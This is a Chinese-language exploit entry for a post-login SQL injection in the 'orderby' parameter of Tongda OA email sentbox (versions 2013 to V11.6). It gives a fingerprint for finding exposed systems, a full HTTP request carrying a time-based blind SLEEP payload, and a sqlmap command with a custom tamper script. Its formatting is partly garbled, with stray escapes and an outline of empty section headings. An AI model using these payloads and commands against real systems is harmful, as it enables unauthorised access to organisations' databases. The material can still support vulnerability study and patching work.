# 通达OAorderby存在后台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=-@%60%27%60%20%20AND%20%28SELECT%205386%20FROM%20%28SELECT%28SLEEP%285%29%29%29rmup%29--%20%27%20&pagelimit=20&tag=&timestamp=1598069133&total= HTTP/1.1`

**请求体 / payload**
```
利用条件：可登录系统的账户，普通权限即可\

登陆后台使用获取到的cookie进行测试
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=4ab8fc42eada7ef077256c00e68e6e8e
Host: 172.20.10.7

sqlmap\
\[TD.py]\(公众号：渗透安全HackTwo
GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=-@`'`%20&pagelimit=20&tag=&timestamp=1598069133&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Cookie: {cookie}
Host: {hostname}
sqlmap -r 1.txt -p orderby --batch --tamper=TD
\[TD.py]\(公众号：渗透安全HackTwo
```

**其他**
- 通达OA orderby存在后台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2013-通达OAV11.6